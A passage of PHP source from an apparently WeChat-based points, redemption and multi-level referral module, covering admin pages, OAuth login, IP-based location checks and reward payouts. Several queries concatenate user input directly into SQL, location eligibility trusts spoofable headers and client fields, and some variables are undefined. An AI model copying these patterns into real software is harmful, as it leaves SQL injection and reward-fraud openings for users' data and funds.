            $list = pdo_fetchall("SELECT * FROM " . tablename($this -> table_goods) . " WHERE weid = '{$_W['weid']}'  ORDER BY px ASC");
        }
        include $this -> template('goods');
    }
    public function doWebAd(){
        $this -> getsq();
        global $_W;
        global $_GPC;
        $operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';
        if ($operation == 'post'){
            $id = intval($_GPC['id']);
            if (!empty($id)){
                $item = pdo_fetch("SELECT * FROM " . tablename($this -> table_ad) . " WHERE id = :id" , array(':id' => $id));
                if (empty($item)){
                    message('抱歉，广告不存在或是已经删除！', '', 'error');
                }
            }
            if (checksubmit('submit')){
                if (empty($_GPC['title'])){
                    message('请输入广告名称！');
                }
                $data = array('weid' => $_W['weid'], 'title' => $_GPC['title'], 'url' => $_GPC['url'], 'pic' => $_GPC['pic'], 'createtime' => TIMESTAMP,);
                if (!empty($id)){
                    pdo_update($this -> table_ad, $data, array('id' => $id));
                }else{
                    pdo_insert($this -> table_ad, $data);
                }
                message('广告更新成功！', $this -> createWebUrl('ad', array('op' => 'display')), 'success');
            }
        }else if ($operation == 'delete'){
            $id = intval($_GPC['id']);
            $row = pdo_fetch("SELECT id FROM " . tablename($this -> table_ad) . " WHERE id = :id", array(':id' => $id));
            if (empty($row)){
                message('抱歉，广告' . $id . '不存在或是已经被删除！');
            }
            pdo_delete($this -> table_ad, array('id' => $id));
            message('删除成功！', referer(), 'success');
        }else if ($operation == 'display'){
            $condition = '';
            $list = pdo_fetchall("SELECT * FROM " . tablename($this -> table_ad) . " WHERE weid = '{$_W['weid']}'  ORDER BY id desc");
        }
        include $this -> template('ad');
    }
    public function doWebRequest(){
        $this -> getsq();
        global $_W, $_GPC;
        $operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display_new';
        if ($operation == 'delete'){
            $id = intval($_GPC['id']);
            $row = pdo_fetch("SELECT * FROM " . tablename($this -> table_request) . " WHERE id = :id", array(':id' => $id));
            if (empty($row)){
                message('抱歉，编号为' . $id . '的兑换请求不存在或是已经被删除！');
            }else if ($row['status'] != 'done'){
                message('未兑换商品无法删除。请兑换后删除！', referer(), 'error');
            }
            pdo_delete($this -> table_request, array('id' => $id));
            message('删除成功！', referer(), 'success');
        }else if ($operation == 'do_goods'){
            $data = array('status' => 'done');
            $id = intval($_GPC['id']);
            $row = pdo_fetch("SELECT * FROM " . tablename($this -> table_request) . " WHERE id = :id", array(':id' => $id));
            if (empty($row)){
                message('抱歉，编号为' . $id . '的兑换请求不存在或是已经被删除！');
            }
            $cfg = $this -> module['config'];
            $goods_info = pdo_fetch("SELECT * FROM " . tablename($this -> table_goods) . " WHERE goods_id = {$row['goods_id']} AND weid = '{$_W['weid']}'");
            if($goods_info['type'] == 5 || $goods_info['type'] == 8){
                if($cfg['txtype'] == 0){
                    $msg = $this -> post_txhb($cfg, $row['openid'], $row['price'] * 100, $desc);
                }elseif($cfg['txtype'] == 1){
                    $msg = $this -> post_qyfk($cfg, $row['openid'], $row['price'] * 100, $desc);
                }
                if($msg['message'] == 'success'){
                    pdo_update($this -> table_request, $data, array('id' => $id));
                    pdo_insert('wdl_jifenbao_paylog', array("uniacid" => $_W["uniacid"], "dwnick" => $row['realname'], "dopenid" => $row['openid'], "dtime" => time(), "dcredit" => $row['cost'], "dtotal_amount" => $row['price'] * 100, "dmch_billno" => $mch_billno, "dissuccess" => 1, "dresult" => ''));
                    message('发送成功', referer(), 'success');
                }else{
                    message('发送失败，错误代码：' . $msg['message'], referer(), 'success');
                }
                exit;
            }
            pdo_update($this -> table_request, $data, array('id' => $id));
            message('审核通过', referer(), 'success');
        }else if ($operation == 'display_new'){
            if (checksubmit('batchsend')){
                foreach ($_GPC['id'] as $id){
                    $data = array('status' => 'done');
                    $row = pdo_fetch("SELECT id FROM " . tablename($this -> table_request) . " WHERE id = :id", array(':id' => $id));
                    if (empty($row)){
                        continue;
                    }
                    pdo_update($this -> table_request, $data, array('id' => $id));
                }
                message('批量兑换成功!', referer(), 'success');
            }
            $condition = '';
            if (!empty($_GPC['name'])){
                $kw = $_GPC['name'];
                $condition .= "  AND (t1.from_user_realname like '%" . $kw . "%' OR  t1.mobile like '%" . $kw . "%' OR t1.realname like '%" . $kw . "%' OR t1.residedist like '%" . $kw . "%') ";
            }
            $pindex = max(1, intval($_GPC['page']));
            $psize = 10;
            $sql = "SELECT t1.*,t2.title FROM " . tablename($this -> table_request) . "as t1 LEFT JOIN " . tablename($this -> table_goods) . " as t2 " . " ON  t2.goods_id=t1.goods_id AND t2.weid=t1.weid AND t2.weid='{$_W['weid']}' WHERE t1.weid = '{$_W['weid']}'  " . $condition . " ORDER BY t1.createtime DESC LIMIT " . ($pindex - 1) * $psize . ",{$psize}";
            $list = pdo_fetchall($sql);
            $ar = pdo_fetchall($sql, array());
            $fanskey = array();
            foreach ($ar as $v){
                $fanskey[$v['from_user']] = 1;
            }
            $total = pdo_fetchcolumn("SELECT t1.*,t2.title FROM " . tablename($this -> table_request) . "as t1 LEFT JOIN " . tablename($this -> table_goods) . " as t2 " . " ON  t2.goods_id=t1.goods_id AND t2.weid=t1.weid AND t2.weid='{$_W['weid']}' WHERE t1.weid = '{$_W['weid']}'  " . $condition . " ORDER BY t1.createtime DESC");
            $pager = pagination($total, $pindex, $psize);
            $fans = fans_search(array_keys($fanskey), array('realname', 'mobile', 'residedist', 'alipay'));
            load() -> model('mc');
        }else{
            $condition = '';
            if (!empty($_GPC['name'])){
                $kw = $_GPC['name'];
                $condition .= "  AND (t1.from_user_realname like '%" . $kw . "%' OR  t1.mobile like '%" . $kw . "%' OR t1.realname like '%" . $kw . "%' OR t1.residedist like '%" . $kw . "%') ";
            }
            $pindex = max(1, intval($_GPC['page']));
            $psize = 10;
            $sql = "SELECT t1.*,t2.title FROM " . tablename($this -> table_request) . "as t1 LEFT JOIN " . tablename($this -> table_goods) . " as t2 " . " ON  t2.goods_id=t1.goods_id AND t2.weid=t1.weid AND t2.weid='{$_W['weid']}' WHERE t1.weid = '{$_W['weid']}'  " . $condition . " ORDER BY t1.createtime DESC LIMIT " . ($pindex - 1) * $psize . ",{$psize}";
            $list = pdo_fetchall($sql);
            $ar = pdo_fetchall($sql, array());
            $fanskey = array();
            foreach ($ar as $v){
                $fanskey[$v['from_user']] = 1;
            }
            $total = pdo_fetchcolumn("SELECT t1.*,t2.title FROM " . tablename($this -> table_request) . "as t1 LEFT JOIN " . tablename($this -> table_goods) . " as t2 " . " ON  t2.goods_id=t1.goods_id AND t2.weid=t1.weid AND t2.weid='{$_W['weid']}' WHERE t1.weid = '{$_W['weid']}'  " . $condition . " ORDER BY t1.createtime DESC");
            $pager = pagination($total, $pindex, $psize);
            $fans = fans_search(array_keys($fanskey), array('realname', 'mobile', 'residedist', 'alipay'));
        }
        include $this -> template('request');
    }
    public function doMobileOauth(){
        global $_W, $_GPC;
        $code = $_GPC['code'];
        load() -> func('communication');
        $weid = intval($_GPC['weid']);
        $uid = intval($_GPC['uid']);
        $do = $_GPC['dw'];
        $reply = pdo_fetch('select * from ' . tablename('wdl_jifenbao_poster') . ' where weid=:weid order by id asc limit 1', array(':weid' => $weid));
        load() -> model('account');
        $cfg = $this -> module['config'];
        if(!empty($code)){
            $url = "https://api.weixin.qq.com/sns/oauth2/access_token?appid=" . $cfg['appid'] . "&secret=" . $cfg['secret'] . "&code={$code}&grant_type=authorization_code";
            $ret = ihttp_get($url);
            if(!is_error($ret)){
                $auth = @json_decode($ret['content'], true);
                if(is_array($auth) && !empty($auth['openid'])){
                    $url = 'https://api.weixin.qq.com/sns/userinfo?access_token=' . $auth['access_token'] . '&openid=' . $auth['openid'] . '&lang=zh_CN';
                    $ret = ihttp_get($url);
                    $auth = @json_decode($ret['content'], true);
                    $insert = array('weid' => $_W['uniacid'], 'openid' => $auth['openid'], 'helpid' => $uid, 'nickname' => $auth['nickname'], 'sex' => $auth['sex'], 'city' => $auth['city'], 'province' => $auth['province'], 'country' => $auth['country'], 'headimgurl' => $auth['headimgurl'], 'unionid' => $auth['unionid'],);
                    $from_user = $_W['fans']['from_user'];
                    isetcookie('wdl_jifenbao_openid' . $weid, $auth['openid'], 1 * 86400);
                    $sql = 'select * from ' . tablename('wdl_jifenbao_member') . ' where weid=:weid AND openid=:openid ';
                    $where = "  ";
                    $fans = pdo_fetch($sql . $where . " order by id asc limit 1 " , array(':weid' => $weid, ':openid' => $auth['openid']));
                    if(empty($fans)){
                        $insert['from_user'] = $from_user;
                        $insert['time'] = time();
                        if($_W['account']['key'] == $reply['appid'])$insert['from_user'] = $auth['openid'];
                        pdo_insert('wdl_jifenbao_member', $insert);
                    }
                    if($do == 'Goods'){
                        $forward = $_W['siteroot'] . "app/index.php?i=" . $_W['uniacid'] . "&c=entry&do=Goods&m=wdl_jifenbao&openid=" . $auth['openid'] . "&wxref=mp.weixin.qq.com#wechat_redirect";
                    }
                    if($do == 'tixian'){
                        $forward = $_W['siteroot'] . "app/index.php?i=" . $_W['uniacid'] . "&c=entry&do=Tixian&m=wdl_jifenbao&openid=" . $auth['openid'] . "&wxref=mp.weixin.qq.com#wechat_redirect";
                    }
                    if($do == 'sharetz'){
                        $forward = $_W['siteroot'] . "app/index.php?i=" . $_W['uniacid'] . "&c=entry&do=Sharetz&uid=" . $uid . "&m=wdl_jifenbao&wxref=mp.weixin.qq.com#wechat_redirect";
                    }
                    header('location:' . $forward);
                    exit;
                }else{
                    die('微信授权失败');
                }
            }else{
                die('微信授权失败');
            }
        }else{
            if($do == 'Goods'){
                $forward = $_W['siteroot'] . "app/index.php?i=" . $_W['uniacid'] . "&c=entry&do=Goods&m=wdl_jifenbao&wxref=mp.weixin.qq.com#wechat_redirect";
            }
            if($do == 'tixian'){
                $forward = $_W['siteroot'] . "app/index.php?i=" . $_W['uniacid'] . "&c=entry&do=Tixian&m=wdl_jifenbao&wxref=mp.weixin.qq.com#wechat_redirect";
            }
            if($do == 'sharetz'){
                $forward = $_W['siteroot'] . "app/index.php?i=" . $_W['uniacid'] . "&c=entry&do=Sharetz&uid=" . $uid . "&m=wdl_jifenbao&wxref=mp.weixin.qq.com#wechat_redirect";
            }
            header('location: ' . $forward);
            exit;
        }
    }
    public function doMobileSharetz(){
        global $_W, $_GPC;
        $weid = intval($_GPC['weid']);
        $uid = intval($_GPC['uid']);
        $reply = pdo_fetch('select * from ' . tablename('wdl_jifenbao_poster') . ' where weid=:weid order by id asc limit 1', array(':weid' => $_W['uniacid']));
        load() -> model('account');
        $cfg = $this -> module['config'];
        if(empty($_GPC['wdl_jifenbao_openid' . $weid])){
            $callback = urlencode($_W['siteroot'] . 'app' . str_replace("./", "/", $this -> createMobileurl('oauth', array('weid' => $weid, 'uid' => $uid, 'dw' => 'sharetz'))));
            $forward = "https://open.weixin.qq.com/connect/oauth2/authorize?appid=" . $cfg['appid'] . "&redirect_uri={$callback}&response_type=code&scope=snsapi_userinfo&state=1#wechat_redirect";
            header('location:' . $forward);
            exit();
        }else{
            $openid = $_GPC['wdl_jifenbao_openid' . $weid];
            if(intval($reply['tztype']) == 1){
                $settings = $this -> module['config'];
                $ips = $this -> getIp();
                $ip = $this -> GetIpLookup($ips);
                $province = $ip['province'];
                $city = $ip['city'];
                $district = $ip['district'];
                include $this -> template('sharetz');
            }else{
                header("location:" . $reply['tzurl']);
            }
        }
    }
    public function doMobileOauthkd(){
        global $_W, $_GPC;
        $code = $_GPC['code'];
        $weid = $_GPC['weid'];
        load() -> model('account');
        $cfg = $this -> module['config'];
        if(!empty($code)){
            $url = "https://api.weixin.qq.com/sns/oauth2/access_token?appid=" . $cfg['appid'] . "&secret=" . $cfg['secret'] . "&code={$code}&grant_type=authorization_code";
            $ret = ihttp_get($url);
            if(!is_error($ret)){
                $auth = @json_decode($ret['content'], true);
                if(is_array($auth) && !empty($auth['openid'])){
                    $url = 'https://api.weixin.qq.com/sns/userinfo?access_token=' . $auth['access_token'] . '&openid=' . $auth['openid'] . '&lang=zh_CN';
                    $ret = ihttp_get($url);
                    $auth = @json_decode($ret['content'], true);
                    isetcookie('wdl_jifenbao_openid' . $weid, $auth['openid'], 1 * 86400);
                    $forward = $this -> createMobileurl('kending', array('weid' => $_GPC['weid'], 'uid' => $_GPC['uid']));
                    header('location:' . $forward);
                    exit;
                }else{
                    die('微信授权失败');
                }
            }else{
                die('微信授权失败');
            }
        }else{
            $forward = $this -> createMobileurl('kending', array('weid' => $_GPC['weid'], 'uid' => $_GPC['uid']));
            header('location: ' . $forward);
            exit;
        }
    }
    public function doMobileKending(){
        global $_W, $_GPC;
        $weid = $_W['uniacid'];
        $uid = $_GPC['uid'];
        load() -> model('mc');
        load() -> model('account');
        $cfg = $this -> module['config'];
        if(empty($_GPC['wdl_jifenbao_openid' . $weid])){
            $callback = urlencode($_W['siteroot'] . 'app' . str_replace("./", "/", $this -> createMobileurl('oauthkd', array('weid' => $weid, 'uid' => $uid))));
            $forward = "https://open.weixin.qq.com/connect/oauth2/authorize?appid=" . $cfg['appid'] . "&redirect_uri={$callback}&response_type=code&scope=snsapi_userinfo&state=1#wechat_redirect";
            header('location:' . $forward);
            exit();
        }else{
            $openid = $_GPC['wdl_jifenbao_openid' . $weid];
        }
        $fans = pdo_fetch('select * from ' . tablename('mc_mapping_fans') . ' where uniacid=:uniacid and uid=:uid order by fanid desc limit 1', array(':uniacid' => $_W['uniacid'], ':uid' => $_GPC['uid']));
        $member = pdo_fetch('select * from ' . tablename('wdl_jifenbao_member') . ' where weid=:weid and openid=:openid order by id desc limit 1', array(':weid' => $_W['uniacid'], ':openid' => $openid));
        if(!empty($member)){
            $data = array('from_user' => $fans['openid']);
            pdo_update('wdl_jifenbao_member', $data, array('weid' => $weid, 'openid' => $openid));
            $share = pdo_fetch('select * from ' . tablename('wdl_jifenbao_share') . ' where weid=:weid and from_user=:from_user order by id asc limit 1', array(':weid' => $_W['uniacid'], ':from_user' => $fans['openid']));
            if(!empty($share)){
                $data = array('jqfrom_user' => $openid, 'nickname' => $member['nickname'], 'avatar' => $member['headimgurl']);
                pdo_update('wdl_jifenbao_share', $data, array('weid' => $weid, 'from_user' => $fans['openid']));
                $this -> sendtext('亲，您已经领取过奖励了，不能重复领取，快去生成海报赚取奖励吧！', $fans['openid']);
                include $this -> template('kending');
                exit;
            }else{
                if(empty($fans['uid'])){
                    include $this -> template('kending');
                    exit;
                }
                pdo_insert($this -> modulename . "_share", array('openid' => $fans['uid'], 'nickname' => $member['nickname'], 'avatar' => $member['headimgurl'], 'createtime' => time(), 'parentid' => $member['helpid'], 'helpid' => $member['helpid'], 'weid' => $_W['uniacid'], 'from_user' => $fans['openid'], 'jqfrom_user' => $openid, 'follow' => 1));
            }
            $credit1 = pdo_fetch('select * from ' . tablename('mc_credits_record') . ' where uniacid=:uniacid and uid=:uid and credittype=:credittype and remark=:remark', array(':uniacid' => $_W['uniacid'], ':uid' => $fans['uid'], ':credittype' => 'credit1', ':remark' => '关注送积分'));
            $credit2 = pdo_fetch('select * from ' . tablename('mc_credits_record') . ' where uniacid=:uniacid and uid=:uid and credittype=:credittype and remark=:remark', array(':uniacid' => $_W['uniacid'], ':uid' => $fans['uid'], ':credittype' => 'credit2', ':remark' => '关注送余额'));
            if(empty($credit1) || empty($credit1)){
                $share = pdo_fetch('select * from ' . tablename('wdl_jifenbao_share') . ' where weid=:weid and from_user=:from_user order by id asc limit 1', array(':weid' => $_W['uniacid'], ':from_user' => $fans['openid']));
                $poster = pdo_fetch("SELECT * FROM " . tablename('wdl_jifenbao_poster') . " WHERE weid = :weid", array(':weid' => $_W['uniacid']));
                if($poster['score'] > 0 || $poster['scorehb'] > 0){
                    $info1 = str_replace('#昵称#', $share['nickname'], $poster['ftips']);
                    $info1 = str_replace('#积分#', $poster['score'], $info1);
                    $info1 = str_replace('#元#', $poster['scorehb'], $info1);
                    if(!empty($poster['score'])){
                        mc_credit_update($share['openid'], 'credit1', $poster['score'], array($share['openid'], '关注送积分'));
                    }
                    if(!empty($poster['scorehb'])){
                        mc_credit_update($share['openid'], 'credit2', $poster['scorehb'], array($share['openid'], '关注送余额'));
                    }
                    $this -> sendtext($info1, $fans['openid']);
                    if($share['helpid'] > 0){
                        if($poster['cscore'] > 0 || $poster['cscorehb'] > 0){
                            $hmember = pdo_fetch('select * from ' . tablename($this -> modulename . "_share") . " where openid='{$share['helpid']}'");
                            if($hmember['status'] == 1){
                                include $this -> template('kending');
                                exit;
                            }
                            $info2 = str_replace('#昵称#', $share['nickname'], $poster['utips']);
                            $info2 = str_replace('#积分#', $poster['cscore'], $info2);
                            $info2 = str_replace('#元#', $poster['cscorehb'], $info2);
                            if(!empty($poster['cscore'])){
                                mc_credit_update($hmember['openid'], 'credit1', $poster['cscore'], array($hmember['openid'], '2级推广奖励'));
                            }
                            if(!empty($poster['cscorehb'])){
                                mc_credit_update($hmember['openid'], 'credit2', $poster['cscorehb'], array($hmember['openid'], '2级推广奖励'));
                            }
                            $this -> sendtext($info2, $hmember['from_user']);
                        }
                        if($poster['pscore'] > 0 || $poster['pscorehb'] > 0){
                            $fmember = pdo_fetch("SELECT * FROM " . tablename('wdl_jifenbao_share') . " WHERE weid = :weid and openid=:openid", array(':weid' => $_W['uniacid'], ':openid' => $hmember['helpid']));
                            if($fmember['status'] == 1){
                                include $this -> template('kending');
                                exit;
                            }
                            $info3 = str_replace('#昵称#', $share['nickname'], $poster['utips2']);
                            $info3 = str_replace('#积分#', $poster['pscore'], $info3);
                            $info3 = str_replace('#元#', $poster['pscorehb'], $info3);
                            if($poster['pscore']){
                                mc_credit_update($fmember['openid'], 'credit1', $poster['pscore'], array($fmember['openid'], '3级推广奖励'));
                            }
                            if($poster['pscorehb']){
                                mc_credit_update($fmember['openid'], 'credit2', $poster['pscorehb'], array($fmember['openid'], '3级推广奖励'));
                            }
                            $this -> sendtext($info3, $fmember['from_user']);
                        }
                    }
                }
                include $this -> template('kending');
                exit;
            }else{
                $this -> sendtext('尊敬的粉丝：\n\n您已经领取过奖励了，不能重复领取，快去生成海报赚取奖励吧！', $fans['openid']);
                include $this -> template('kending');
                exit;
            }
        }
        $this -> sendtext('尊敬的粉丝：\n\n您不能领取奖励哦，只有通过扫海报进来的，才能领取奖励！快去生成海报赚取奖励吧！', $fans['openid']);
        include $this -> template('kending');
    }
    private function sendtext($txt, $openid){
        global $_W;
        $acid = $_W['account']['acid'];
        if(!$acid){
            $acid = pdo_fetchcolumn("SELECT acid FROM " . tablename('account') . " WHERE uniacid=:uniacid ", array(':uniacid' => $_W['uniacid']));
        }
        $acc = WeAccount :: create($acid);
        $data = $acc -> sendCustomNotice(array('touser' => $openid, 'msgtype' => 'text', 'text' => array('content' => urlencode($txt))));
        return $data;
    }
    function GetIpLookup($ip = ''){
        if(empty($ip)){
            $ip = GetIp();
        }
        $res = @file_get_contents('http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=js&ip=' . $ip);
        if(empty($res)){
            return false;
        }
        $jsonMatches = array();
        preg_match('#\{.+?\}#', $res, $jsonMatches);
        if(!isset($jsonMatches[0])){
            return false;
        }
        $json = json_decode($jsonMatches[0], true);
        if(isset($json['ret']) && $json['ret'] == 1){
            $json['ip'] = $ip;
            unset($json['ret']);
        }else{
            return false;
        }
        return $json;
    }
    public function doMobileDiqu(){
        global $_W, $_GPC;
        $uid = $_GPC['uid'];
        $ip = $this -> getIp();
        $settings = $this -> module['config'];
        $ip = $this -> GetIpLookup($ip);
        $province = $ip['province'];
        $city = $ip['city'];
        $district = $ip['district'];
        include $this -> template('diqu');
    }
    public function doMobileFwdiqu(){
        global $_W, $_GPC;
        $uid = $_GPC['uid'];
        $scene_id = $_GPC['scene_id'];
        $from_user = $_GPC['from_user'];
        $ip = $this -> getIp();
        $settings = $this -> module['config'];
        $ip = $this -> GetIpLookup($ip);
        $province = $ip['province'];
        $city = $ip['city'];
        $district = $ip['district'];
        include $this -> template('fwdiqu');
    }
    function getIp(){
        $onlineip = '';
        if(getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')){
            $onlineip = getenv('HTTP_CLIENT_IP');
        }elseif(getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')){
            $onlineip = getenv('HTTP_X_FORWARDED_FOR');
        }elseif(getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')){
            $onlineip = getenv('REMOTE_ADDR');
        }elseif(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')){
            $onlineip = $_SERVER['REMOTE_ADDR'];
        }
        return $onlineip;
    }
    public function doMobileAjxdiqu(){
        global $_W, $_GPC;
        $diqu = $_GPC['city'];
        $province = $_GPC['province'];
        $district = $_GPC['district'];
        $uid = $_GPC['uid'];
        $scene_id = $_GPC['scene_id'];
        $from_user = $_GPC['from_user'];
        $ddtype = $_GPC['ddtype'];
        $cfg = $this -> module['config'];
        load() -> model('mc');
        $fans = pdo_fetch('select * from ' . tablename('mc_mapping_fans') . ' where uniacid=:uniacid and uid=:uid order by fanid asc limit 1', array(':uniacid' => $_W['uniacid'], ':uid' => $uid));
        $user = mc_fetch($uid);
        $pos = stripos($cfg['city'], $diqu);
        if($ddtype == 1){
            $nzmsg = "抱歉!\n\n核对位置失败，请先开启共享位置功能！";
            $this -> sendtext($nzmsg, $fans['openid']);
            exit;
        }
        if ($pos === false){
            $nzmsg = "抱歉!\n\n本次活动只针对【" . $cfg['city'] . "】微信用户开放\n\n您所在的位置【" . $diqu . "】未开启活动，您不能参与本次活动，感谢您的支持!";
            mc_update($uid, array('resideprovince' => $province, 'residecity' => $diqu, 'residedist' => $district));
        }else{
            mc_update($uid, array('resideprovince' => $province, 'residecity' => $diqu, 'residedist' => $district));
            $nzmsg = '位置核对成功，请点击菜单【生成海报】参加活动!';
        }
        $this -> sendtext($nzmsg, $fans['openid']);
    }
    public function doMobileFwajxdiqu(){
        global $_W, $_GPC;
        $diqu = $_GPC['city'];
        $province = $_GPC['province'];
        $district = $_GPC['district'];
        $uid = $_GPC['uid'];
        $scene_id = $_GPC['scene_id'];
        $from_user = $_GPC['from_user'];
        $ddtype = $_GPC['ddtype'];
        $cfg = $this -> module['config'];
        load() -> model('mc');
        $fans = pdo_fetch('select * from ' . tablename('mc_mapping_fans') . ' where uniacid=:uniacid and uid=:uid order by fanid asc limit 1', array(':uniacid' => $_W['uniacid'], ':uid' => $uid));
        $user = mc_fetch($uid);
        $pos = stripos($cfg['city'], $diqu);
        if($ddtype == 1){
            $nzmsg = "抱歉!\n\n核对位置失败，请先开启共享位置功能！";
            $this -> sendtext($nzmsg, $fans['openid']);
            exit;
        }
        if ($pos === false){
            $nzmsg = "抱歉!\n\n本次活动只针对【" . $cfg['city'] . "】微信用户开放\n\n您所在的位置【" . $diqu . "】未开启活动，您不能参与本次活动，感谢您的支持!";
            mc_update($uid, array('resideprovince' => $province, 'residecity' => $diqu, 'residedist' => $district));
            $this -> sendtext($nzmsg, $fans['openid']);
        }else{
            mc_update($uid, array('resideprovince' => $province, 'residecity' => $diqu, 'residedist' => $district));
            $nzmsg = '位置核对成功，请点击菜单【生成海报】参加活动!';
            $this -> sendtext($nzmsg, $fans['openid']);
            $this -> postjiangli($scene_id, $from_user);
        }
    }
    public function postjiangli($scene_id, $from_user){
        global $_W, $_GPC;
        $fans = mc_fetch($from_user);
        $poster = pdo_fetch("SELECT * FROM " . tablename('wdl_jifenbao_poster') . " WHERE weid = :weid", array(':weid' => $_W['uniacid']));
        if (empty($fans['nickname']) || empty($fans['avatar'])){
            $openid = $this -> message['from'];
            $ACCESS_TOKEN = $this -> getAccessToken();
            $url = "https://api.weixin.qq.com/cgi-bin/user/info?access_token={$ACCESS_TOKEN}&openid={$openid}&lang=zh_CN";
            load() -> func('communication');
            $json = ihttp_get($url);
            $userInfo = @json_decode($json['content'], true);
            $fans['nickname'] = $userInfo['nickname'];
            $fans['avatar'] = $userInfo['headimgurl'];
            $fans['province'] = $userInfo['province'];
            $fans['city'] = $userInfo['city'];
            $fans['unionid'] = $userInfo['unionid'];
            mc_update($this -> message['from'], array('nickname' => $mc['nickname'], 'avatar' => $mc['avatar']));
        }
        $hmember = pdo_fetch("SELECT * FROM " . tablename('wdl_jifenbao_share') . " WHERE weid = :weid and sceneid=:sceneid", array(':weid' => $_W['uniacid'], ':sceneid' => $scene_id));
        $member = pdo_fetch("SELECT * FROM " . tablename('wdl_jifenbao_share') . " WHERE weid = :weid and from_user=:from_user", array(':weid' => $_W['uniacid'], ':from_user' => $from_user));
        if (empty($member)){
            pdo_insert($this -> modulename . "_share", array('openid' => $fans['uid'], 'nickname' => $fans['nickname'], 'avatar' => $fans['avatar'], 'pid' => $poster['id'], 'createtime' => time(), 'helpid' => $hmember['openid'], 'weid' => $_W['uniacid'], 'score' => $poster['score'], 'cscore' => $poster['cscore'], 'pscore' => $poster['pscore'], 'from_user' => $this -> message['from'], 'follow' => 1));
            $share['id'] = pdo_insertid();
            $share = pdo_fetch('select * from ' . tablename($this -> modulename . "_share") . " where id='{$share['id']}'");
            if($poster['kdtype'] == 1){
                if(!empty($hmember['from_user'])){
                    $mcsj = mc_fetch($hmember['from_user']);
                    $msgsj = "您已通过「" . $mcsj['nickname'] . "」，成功关注，点击下方\n\n「菜单-领取奖励」\n\n为好友加分";
                }else{
                    $msgsj = '您需要点击「领取奖励」才能得到积分哦!';
                }
                $this -> sendtext($msgsj, $from_user);
                exit;
            }
            if($poster['score'] > 0 || $poster['scorehb'] > 0){
                $info1 = str_replace('#昵称#', $fans['nickname'], $poster['ftips']);
                $info1 = str_replace('#积分#', $poster['score'], $info1);
                $info1 = str_replace('#元#', $poster['scorehb'], $info1);
                if($poster['score']){
                    mc_credit_update($share['openid'], 'credit1', $poster['score'], array($share['openid'], '关注送积分'));
                }
                if($poster['scorehb']){
                    mc_credit_update($share['openid'], 'credit2', $poster['scorehb'], array($share['openid'], '关注送余额'));
                }
                $this -> sendtext($info1, $from_user);
            }
            if($poster['cscore'] > 0 || $poster['cscorehb'] > 0){
                if($hmember['status'] == 1){
                    exit;
                }
                $info2 = str_replace('#昵称#', $fans['nickname'], $poster['utips']);
                $info2 = str_replace('#积分#', $poster['cscore'], $info2);
                $info2 = str_replace('#元#', $poster['cscorehb'], $info2);
                if($poster['cscore']){
                    mc_credit_update($hmember['openid'], 'credit1', $poster['cscore'], array($hmember['openid'], '2级推广奖励'));
                }
                if($poster['cscorehb']){
                    mc_credit_update($hmember['openid'], 'credit2', $poster['cscorehb'], array($hmember['openid'], '2级推广奖励'));
                }
                $this -> sendtext($info2, $hmember['from_user']);
            }
            if($poster['pscore'] > 0 || $poster['pscorehb'] > 0){
                $fmember = pdo_fetch("SELECT * FROM " . tablename('wdl_jifenbao_share') . " WHERE weid = :weid and openid=:openid", array(':weid' => $_W['uniacid'], ':openid' => $hmember['helpid']));
                if($fmember['status'] == 1){
                    exit;
                }
                if($fmember){
                    $info3 = str_replace('#昵称#', $fans['nickname'], $poster['utips2']);
                    $info3 = str_replace('#积分#', $poster['pscore'], $info3);
                    $info3 = str_replace('#元#', $poster['pscorehb'], $info3);
                    if($poster['pscore']){
                        mc_credit_update($fmember['openid'], 'credit1', $poster['pscore'], array($hmember['openid'], '3级推广奖励'));
                    }
                    if($poster['pscorehb']){
                        mc_credit_update($fmember['openid'], 'credit2', $poster['pscorehb'], array($hmember['openid'], '3级推广奖励'));
                    }
                    $this -> sendtext($info3, $fmember['from_user']);
                }
            }
        }else{
            $this -> sendtext('亲，您已经是粉丝了，快去生成海报赚取奖励吧', $from_user);
        }
    }
    public function doMobileGoods(){
        global $_W, $_GPC;
        $now = time();
        $weid = $_W['weid'];
        $cfg = $this -> module['config'];
        $goods_list = pdo_fetchall("SELECT * FROM " . tablename($this -> table_goods) . " WHERE weid = '{$_W['weid']}' and $now < endtime and amount >= 0 order by px ASC");
        $my_goods_list = pdo_fetch("SELECT * FROM " . tablename($this -> table_request) . " WHERE  from_user='{$_W['fans']['from_user']}' AND weid = '{$_W['weid']}'");
        $ad = pdo_fetchall("SELECT * FROM " . tablename($this -> table_ad) . " WHERE weid = '{$_W['weid']}' order by id desc");
        load() -> model('account');
        $cfg = $this -> module['config'];
        if($cfg['jiequan'] == 1){
            load() -> model('account');
            $cfg = $this -> module['config'];
            if(empty($_GPC['wdl_jifenbao_openid' . $weid])){
                if(empty($_GPC['openid'])){
                    $callback = urlencode($_W['siteroot'] . 'app' . str_replace("./", "/", $this -> createMobileurl('oauth', array('weid' => $weid, 'dw' => 'Goods'))));
                    $forward = "https://open.weixin.qq.com/connect/oauth2/authorize?appid=" . $cfg['appid'] . "&redirect_uri={$callback}&response_type=code&scope=snsapi_userinfo&state=1#wechat_redirect";
                    header('location:' . $forward);
                    exit();
                }else{
                    $openid = $_GPC['wdl_jifenbao_openid' . $weid];
                }
            }
        }
        if(!empty($_GPC['wdl_jifenbao_openid' . $weid])){
            $openid = $_GPC['wdl_jifenbao_openid' . $weid];
        }elseif(!empty($_GPC['openid'])){
            $openid = $_GPC['openid'];
        }
        $sql = 'select * from ' . tablename('wdl_jifenbao_member') . ' where weid=:weid AND openid=:openid order by id asc limit 1';
        $member = pdo_fetch($sql, array(':weid' => $_W['weid'], ':openid' => $openid));
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        if (!strpos($userAgent, 'MicroMessenger')){
            message('请使用微信浏览器打开！');
            $openid = 'oUvXSsv6hNi7wdmd5uWQUTS4vJTY';
            $fans = pdo_fetch("select * from ims_mc_mapping_fans where openid='{$openid}'");
        }else{
            load() -> model('mc');
            $fans = $_W['fans'];
